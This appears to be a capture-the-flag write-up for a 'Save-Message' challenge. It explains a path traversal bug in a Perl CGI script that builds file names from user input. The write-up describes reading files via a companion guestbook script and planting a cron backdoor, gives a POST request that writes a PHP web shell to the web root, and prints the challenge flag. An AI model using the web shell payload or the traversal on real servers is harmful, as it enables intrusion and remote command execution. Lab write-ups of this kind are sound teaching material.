# Save-Message — Writeup

## Vulnerability

`save_message.pl` constructs a filename from user-supplied `last` and `first` parameters
and writes the `comment` parameter into it — no path sanitization:

```perl
my $filename = join "", ${last}, ${first};
open MSGFILE, "> $filename" or ...;
print MSGFILE $msg;
```

This allows two separate attacks:

1. **Arbitrary file read** via the companion `guestbook.pl` (which does `cat $QUERY_STRING`).
2. **Arbitrary file write**: supply `last=../` and `first=<target>` to write outside the web root,
   or supply `last=` and `first=../../../etc/cron.d/backdoor` to plant a cron job.

## Exploitation

Write a PHP web shell to the web root:

```
POST /cgi-bin/save_message.pl
last=..%2Fhtdocs%2Fshell&first=.php&comment=<?php+system($_GET['cmd']);?>
```

Then access `/htdocs/shell.php?cmd=cat+/flag.txt`.

Or, read any file on the server by passing the path as the filename to the `guestbook.pl` endpoint
(the two scripts are intentionally chained in the kill-chain exercise).

## Flag

`FLAG_ICTF2002{path_traversal_is_trivial_when_you_trust_user_input}`
